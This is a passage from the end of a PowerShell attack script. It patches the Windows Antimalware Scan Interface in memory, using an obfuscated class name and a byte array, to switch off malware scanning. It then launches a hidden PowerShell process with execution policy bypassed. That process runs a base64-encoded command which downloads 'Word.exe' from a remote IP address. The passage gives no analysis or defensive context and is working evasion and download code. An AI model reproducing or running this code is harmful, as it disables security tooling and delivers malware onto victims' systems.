0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 12, 0, 0, 0, 96, 60, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)) | 
    Out-Null;
  }
  [GiveBananaTo.AngerMonkeyScriptInterrogator]::Patch();
}
GiveBanana;
Start-Sleep 1;
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAxAC4AMwAuADEAOQAzAC8AVwBvAHIAZAAuAGUAeABlACcAKQA=;
